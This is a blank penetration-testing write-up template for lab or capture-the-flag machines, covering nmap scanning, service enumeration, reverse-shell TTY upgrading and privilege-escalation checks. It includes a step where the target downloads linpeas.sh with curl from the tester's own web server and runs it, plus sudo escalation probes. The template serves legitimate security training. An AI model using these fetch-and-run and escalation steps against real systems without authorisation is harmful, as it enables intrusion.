# Assessment/Box Name
#tags

`Machine info:` information that is provided about the box goes here
---

## Preparation
This is the usual preamble to initialise my environment prior to conducting an assessment, this section has been automated by the [config.sh](https://github.com/rmcmillan34/pentest-tools/) script, but it is captured here for basic visibility of my mehodology.
```bash
export TARGET_IP=
export TARGET_NAME=
export PLATFORM=
mkdir ~/machines/${PLATFORM}/${TARGET_NAME}/nmap
cd ~/machines/${PLATFORM}/${TARGET_NAME}
mkdir exfil
```
---

## Enumeration
- OS:
- Users:
  - 
- Emails:
  -   
### Port Scan
#### Quick Scan
```bash
#Default Quick SYN Scan
sudo nmap -sS -sC -sV -O -A ${TARGET_IP}-oA ./${TARGET_NAME)/nmap/${TARGET_NAME}_quick -F -v
```
Output:
```

```

#### Full Scan
```bash
#Default Full SYN Scan
sudo nmap -sS -sC -sV -O -A ${TARGET_IP} -oA ./nmap/${TARGET_NAME}_full -p- -T 4 -v
```
Output:
```

```

#### UDP Scan
```bash
#Default UPD Scan
sudo nmap -sU -sC -sV -O -A ${TARGET_IP} -oA ./nmap/${TARGET_NAME}_udp_full -p- -T 4 -v
```
Output:
```

```

### Vulnerability Scan
```bash
#Default Vulnerability Scan
sudo nmap --script html-vuln*, ssh-vuln* ${TARGET} -p VULN_PORTS -oA ./nmap/${TARGET_NAME}_vuln
```
Output:
```

```

---
## Service Enumeration
In this section, we will interact with the services identified in our Nmap scans. We will try to identify vulnerable components, and understand the functionalities of the services to try to break them.

Services and methodology checklists

### Service X - FTP - Port 21
**Software:**
**Version(s):**
**Publicly available exploits:**

**Fingerprint:**

### Service X - SSH - Port 22
**Software:**
**Version(s):**
**Publicly available exploits:**

**Fingerprint:**

### Service X - HTTP(S) - Port XXX
**Software:** 
**Version:**
**Publicly available exploits:**

**Fingerprint:**

---

## Exploitation
### Service 1 - Port XXX
#### Vulnerability: XXXX

**PoC**
```
# Show the steps to exploit the identified vulnerability
```

---

## Post-Exploitation
After gaining a reverse shell its always a good idea to upgrade your shell to a full TTY.
The best resource I have seen for this is [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)

```bash
# Ensure we have python(3) on the box
which python3
/usr/bin/python3

# Spawn a new bash shell with Python
python3 -c "import pty;pty.spawn('/bin/bash')"

# Hit CTRL+Z return to local machine
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

ls
```

### Exfiltration

### Privileged Enumeration - USERNAME
To find a way to move laterally or vertically, we need to find some type of misconfiguration on the machine. The easiest way I have found is to upload a copy of linpeas to the target machine in a writeable directory (`/dev/shm`)

```bash
# On local machine in directory with linpeas.sh
python3 -m http.server 8001
```
Now with our local webserver running we can download linpeas.sh, make it executable and run it.
```
cd /dev/shm
curl -o linpeas.sh HTTP://LOCAL_IP:8001/linpeas.sh;chmod +x ./linpeas.sh

# Run linpeas and output to file
./linpeas.sh -a > ./linpeas-${USER}.txt
```

#### Files/Configuration Enumeration


#### Internal Services Enumeration
We should check our linpeas.sh output for any ports/services that were not visible when scanning the target externally.

### Lateral Movement

### Escalation
#### Low Hanging Fruit
**Switch User**
```bash
# Try with known passwords and no password
sudo su
```
**Sudo Privileges**
```
sudo -l
```

### Root Exfiltration

---

## Culmination
*What did I learn from this box? What are the key findings? What are the mitigations that the owner of this box can put in place to remediate the vulnerabilities in the short, medium and long term?*

## Beyond Root
In this section we will try to show how we could implement the mitigations on the box, or if there was an alternate method of exploitation to achieve our objectives.
